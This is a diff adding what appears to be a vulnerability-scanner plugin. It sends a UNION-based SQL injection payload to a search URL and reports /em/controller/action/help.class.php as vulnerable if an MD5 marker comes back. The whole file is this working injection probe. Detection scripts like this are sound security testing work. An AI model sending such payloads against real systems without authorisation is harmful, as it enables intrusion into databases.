@@ -1,0 +1,14 @@
+#request url = var
+#define payload = /user/?q=help&type=search&page=1&kw=
+#define bug = 5d975967029ada386ba2980a04b7720e
+#define info = /em/controller/action/help.class.php SQL Injection
+#define post = ") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,md5(360213360213),NULL
+
+function main(args)
+{
+	res = HttpPost(url.payload,post."#","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+	if(StrFindStr(res[0],bug,0)!= "-1")
+	{
+		print(url.info);
+	}
+}
